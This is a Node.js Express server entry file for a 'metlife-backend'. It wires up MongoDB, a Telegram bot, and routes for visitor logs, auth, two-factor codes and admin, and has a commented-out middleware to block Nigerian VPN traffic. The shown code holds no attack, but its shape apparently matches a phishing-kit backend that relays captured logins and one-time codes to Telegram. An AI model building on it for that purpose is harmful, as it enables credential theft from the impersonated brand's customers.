require('dotenv').config();

const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const visitorLogRoutes = require('./routes/visitor-log');
const authRoutes = require('./routes/auth');
const twoFactorRoutes = require('./routes/two-factor');
const adminRoutes = require('./routes/admin');
const { getBot, isBotConnected } = require('./bot');

const app = express();
const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/metlife';
console.log(process.env.TELEGRAM_CHAT_ID)

//const blockNigeriaVPN = require('./middleware/dropCon');

//app.set('trust proxy', true); // important if you're behind nginx/Cloudflare/etc.


// ...rest of your routes

// Middleware
//app.use(blockNigeriaVPN);
app.use(cors());
app.use(express.json());

// ============================================================
// Health & Status Endpoints
// ============================================================

/**
 * GET /health - Simple health check
 */
app.get('/health', (req, res) => {
  const botConnected = isBotConnected();

  return res.json({
    status: 'ok',
    service: 'metlife-backend',
    bot: botConnected ? 'connected' : 'disconnected',
    timestamp: new Date().toISOString(),
  });
});

/**
 * GET /status - Detailed status endpoint
 */
app.get('/status', async (req, res) => {
  try {
    const botConnected = isBotConnected();

    return res.json({
      status: 'ok',
      service: 'metlife-backend',
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
      bot: {
        connected: botConnected,
        status: botConnected ? 'polling' : 'disabled',
      },
      server: {
        nodeVersion: process.version,
        platform: process.platform,
        memory: process.memoryUsage(),
      },
    });
  } catch (err) {
    console.error('[status] Error:', err);
    return res.status(500).json({
      status: 'error',
      message: 'Failed to retrieve status',
      error: err.message,
    });
  }
});

// ============================================================
// API Routes
// ============================================================

app.use('/api/auth', authRoutes);
app.use('/api/logs', visitorLogRoutes);
app.use('/api/two-factor', twoFactorRoutes);
app.use('/api/admin', adminRoutes);

// ============================================================
// 404 & Error Handlers
// ============================================================

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    message: 'Not found',
    path: req.path,
    method: req.method,
  });
});

// Central error handler
app.use((err, req, res, next) => {
  console.error('[server] Error:', err);
  res.status(500).json({
    message: 'Internal server error',
    error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
  });
});

// ============================================================
// Server Startup
// ============================================================

async function start() {
  try {
    // Connect to MongoDB
    console.log('[mongodb] Connecting to database...');
    await mongoose.connect(MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('[mongodb] ✅ Connected to MongoDB');

    // Initialize Telegram Bot
    console.log('[telegram] Initializing Telegram bot...');
    const bot = getBot();
    if (bot) {
      console.log('[telegram] ✅ Telegram bot initialized');
    } else {
      console.warn('[telegram] ⚠️ Telegram bot disabled or not configured');
    }

    // Start Express server
    app.listen(PORT, () => {
      console.log(`[server] ✅ metlife backend running on port ${PORT}`);
      console.log(`[server] Health check available at http://localhost:${PORT}/health`);
      console.log(`[server] Status endpoint available at http://localhost:${PORT}/status`);
    });
  } catch (err) {
    console.error('[server] ❌ Failed to start server:', err.message);
    process.exit(1);
  }
}

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('[server] Shutting down gracefully...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('[server] Shutting down due to SIGTERM...');
  process.exit(0);
});

start();
